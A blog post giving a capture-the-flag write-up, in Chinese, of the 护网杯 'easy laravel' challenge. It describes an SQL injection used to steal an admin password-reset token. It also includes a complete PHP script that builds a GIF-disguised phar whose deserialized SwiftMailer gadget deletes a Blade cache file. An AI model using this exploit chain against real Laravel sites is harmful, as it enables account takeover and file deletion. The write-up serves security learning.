---
layout: post
title:  护网杯-easy laravel-Writeup
noToc: true
date:   2018-10-14 16:30:00 +0800
tags: WEB CTF 护网杯
cover: '../assets/test1.png'
---

##  护网杯-easy laravel-Writeup

​                                      Category: [PHP](http://www.venenof.com/index.php/category/PHP/), [CTF](http://www.venenof.com/index.php/category/CTF/), [Web](http://www.venenof.com/index.php/category/Web/)

​                                      文章来源于原venenof-[Web](http://www.venenof.com/index.php/category/Web/)，转载venenof

护网杯碰到一个`Laravel`的代码审计题目，刚好最近在用`LA`写平台，于是就很感兴趣，题目整体不难，对`Laravel`框架熟悉就可以做，但整个利用链构造的比较巧妙，感谢出题人@4uuu Nya出了这么一个有意思的题目。

------

源码可以发现`https://github.com/qqqqqqvq/easy_laravel`，下载下来本地看一下源码：

```
$factory->define(App\User::class, function (Faker\Generator $faker) {
    static $password;

    return [
        'name' => '4uuu Nya',
        'email' => 'admin@qvq.im',
        'password' => bcrypt(str_random(40)),
        'remember_token' => str_random(10),
    ];
});
```

很显然，管理员的登陆邮箱已经知道了，同时也知道密码是随机`40`位字符串，基本不可能爆破。

看一下路由，发现只有`note`可以在非admin用户下访问，看一下`NoteController`:

```
public function index(Note $note)
{
    $username = Auth::user()->name;
    $notes = DB::select("SELECT * FROM `notes` WHERE `author`='{$username}'");
    return view('note', compact('notes'));
}
```

明显的`sqli`，我们可以获取任何数据库中的内容，但是密码我们即使拿到了也没有什么用，我们发现其注册登陆的整个流程都是`Laravel`官方推荐的，也就是管理员肯定是这么安装的：

```
php artisan make:auth
```

既然没有重构这部分代码，也就意味着我们可以去重置管理员密码，点击重置密码时，输入管理员邮箱`admin@qvq.im`，那么`password_resets`中会更新一个token，访问`/password/reset/token`即可重置密码，首先利用注入拿到token：
 ![web1.png](http://www.venenof.com/usr/uploads/2018/10/3884211593.png)
 然后修改密码即可:
 ![web2.png](http://www.venenof.com/usr/uploads/2018/10/2368972807.png)

> Blade 模版

进入后台后，访问`http://49.4.78.51:32310/flag`是提示`no flag`，但是我们看一下`FlagController`

```
    public function showFlag()
    {
        $flag = file_get_contents('/th1s1s_F14g_2333333');
        return view('auth.flag')->with('flag', $flag);
    }
```

很明显，blade渲染的跟我们看到的明显不一样，如果用`Laravel`写过东西，经常会遇到这种问题，明明blade更新了，页面却没有显示，这都是因为`Laravel`的模版缓存，很明显，现在我们需要去更改flag的模版缓存，缓存文件的名字是laravel自动生成的，生成方法如下：

```
/**
     * Get the path to the compiled version of a view.
     *
     * @param  string  $path
     * @return string
*/
public function getCompiledPath($path)
{
    return $this->cachePath.'/'.sha1($path).'.php';
}
```

但是整个站的逻辑很简单，没有其他文件操作的点，那么就剩下了`UploadController`，只能上传图片，但是有一个方法引起了我的兴趣：

```
public function check(Request $request)
{
    $path = $request->input('path', $this->path);
    $filename = $request->input('filename', null);
    if($filename){
        if(!file_exists($path . $filename)){
            Flash::error('磁盘文件已删除，刷新文件列表');
        }else{
            Flash::success('文件有效');
        }
    }
    return redirect(route('files'));
}
```

`path`跟`filename`没有任何过滤，而我们可以利用`file_exists`去操作phar包，这里很明显存在一个反序列化，于是现在的思路很明确：

`phar反序列化=>文件操作删除或者移除=>laravel重新渲染blade=>读取flag`

看了下`composer`，发现都是默认组件，于是全局搜一下`unlink`，在`Swift_ByteStream_TemporaryFileByteStream`的析构函数中存在`unlink`方法:
 ![nnn.png](http://www.venenof.com/usr/uploads/2018/10/577144858.png)
 于是直接构造即可:

```
<?php
class Swift_ByteStream_AbstractFilterableInputStream {
    /**
     * Write sequence.
     */
    protected $sequence = 0;
    /**
     * StreamFilters.
     *
     * @var Swift_StreamFilter[]
     */
    private $filters = [];
    /**
     * A buffer for writing.
     */
    private $writeBuffer = '';
    /**
     * Bound streams.
     *
     * @var Swift_InputByteStream[]
     */
    private $mirrors = [];
}
class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream {
    /** The internal pointer offset */
    private $_offset = 0;

    /** The path to the file */
    private $_path;

    /** The mode this file is opened in for writing */
    private $_mode;

    /** A lazy-loaded resource handle for reading the file */
    private $_reader;

    /** A lazy-loaded resource handle for writing the file */
    private $_writer;

    /** If magic_quotes_runtime is on, this will be true */
    private $_quotes = false;

    /** If stream is seekable true/false, or null if not known */
    private $_seekable = null;

    /**
     * Create a new FileByteStream for $path.
     *
     * @param string $path
     * @param bool   $writable if true
     */
    public function __construct($path, $writable = false)
    {
        $this->_path = $path;
        $this->_mode = $writable ? 'w+b' : 'rb';

        if (function_exists('get_magic_quotes_runtime') && @get_magic_quotes_runtime() == 1) {
            $this->_quotes = true;
        }
    }

    /**
     * Get the complete path to the file.
     *
     * @return string
     */
    public function getPath()
    {
        return $this->_path;
    }
}
class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream {
    public function __construct() {
        $filePath = "/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php";
        parent::__construct($filePath, true);
    }
    public function __destruct() {
        if (file_exists($this->getPath())) {
            @unlink($this->getPath());
        }
    }
}
$obj = new Swift_ByteStream_TemporaryFileByteStream();
$p = new Phar('./1.phar', 0);
$p->startBuffering();
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$p->setMetadata($obj);
$p->addFromString('1.txt','text');
$p->stopBuffering();
rename('./1.phar', '1.gif');
?>
```

然后上传，`check`的时候触发反序列化即可删除模版文件，然后访问`flag`路由拿到flag:-P
 ![x.png](http://www.venenof.com/usr/uploads/2018/10/714312758.png)